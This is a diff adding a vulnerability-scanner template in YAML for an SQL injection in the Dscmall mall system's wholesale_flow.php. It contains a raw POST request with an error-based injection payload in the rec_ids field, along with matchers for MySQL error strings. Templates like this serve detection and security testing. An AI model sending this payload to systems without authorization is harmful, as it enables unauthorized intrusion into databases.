@@ -1,0 +1,28 @@
+id: poc-yaml-dscmall-wholesale-flow-php-sqli
+info:
+  name: Dscmall Wholesale Flow SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+  description: |
+    SQL injection vulnerability in Dscmall multi-user mall system's wholesale_flow.php, exploitable via the ajax_update_cart step.
+
+http:
+  - raw:
+      - |
+        POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        rec_ids[]=extractvalue(1,concat(0x7e,version()))
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "MySQL server error report:Array"
+          - "dsc_wholesale_cart"
+          - "XPATH syntax error"
